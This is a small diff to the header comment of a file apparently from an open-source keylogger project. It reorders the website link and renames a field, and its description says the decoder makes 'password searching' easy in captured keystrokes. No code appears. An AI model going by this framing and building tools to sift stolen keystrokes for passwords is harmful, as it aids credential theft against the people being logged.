@@ -1,9 +1,9 @@
 /**
 * Developer: Minhas Kamal (minhaskamal024@gmail.com)
 * Date: 15.Aug.2014
+* Website: https://minhaskamal.github.io/StupidKeylogger
 * License: MIT License
-* Website: https://minhaskamal.github.io/StupidKeyLogger
-* Comment: A simple ASCII to character decoder, but efficient in removing
+* Intro: A simple ASCII to character decoder, but efficient in removing
 *    apparently useless data. Which makes 'password searching' easy!
 **/
 
